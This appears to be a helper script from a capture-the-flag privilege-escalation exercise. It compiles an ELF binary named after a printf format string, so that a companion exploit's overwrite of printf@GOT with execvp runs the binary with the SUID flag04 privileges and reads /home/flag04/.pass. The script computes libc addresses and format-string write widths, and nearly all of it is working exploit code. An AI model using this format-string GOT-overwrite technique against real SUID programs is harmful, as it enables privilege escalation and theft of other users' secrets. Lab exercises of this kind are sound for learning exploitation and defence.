#!/usr/bin/env python3
"""level04 - riviera : prepare le helper pour exploit.py.

Compile un petit binaire ELF dont le NOM est exactement la format string
d'exploit.py. exploit.py ecrase printf@GOT -> execvp, puis printf(tag) devient
execvp(tag, 0) : execve de CE binaire. Comme c'est un ELF (pas un script),
execve preserve l'euid SUID flag04 -> le helper lit /home/flag04/.pass.
(dash via system() abandonnerait l'euid : d'ou l'ELF compile.)

Le binaire va dans /home/level04 ; exploit.py lance riviera avec
PATH=/home/level04 pour qu'execvp le trouve par son nom.
"""
import os
import subprocess
import textwrap
from pwn import ELF

HOME = '/home/level04'

# meme calcul de tag que exploit.py (voir exploit.py pour le detail)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
execvp = 0x7ffff7c00000 + libc.symbols['execvp']
b0, mid16 = execvp & 0xff, (execvp >> 8) & 0xffff
w1, w2 = b0 % 256, (mid16 - b0) % 0x10000
tag = '%%1$%dc%%10$hhn%%1$%dc%%11$hn' % (w1, w2)

src = '/tmp/h4.c'
open(src, 'w').write(textwrap.dedent('''
    #include <stdio.h>
    int main(void){
        char b[128];
        FILE *f = fopen("/home/flag04/.pass", "r");
        if (!f) { perror("open"); return 1; }
        if (fgets(b, sizeof b, f)) printf("FLAG04=%s", b);
        fclose(f);
        return 0;
    }
'''))

path = os.path.join(HOME, tag)
subprocess.run(['gcc', '-O0', src, '-o', path], check=True)
os.chmod(path, 0o755)
print('tag    =', tag)
print('helper =', repr(path))
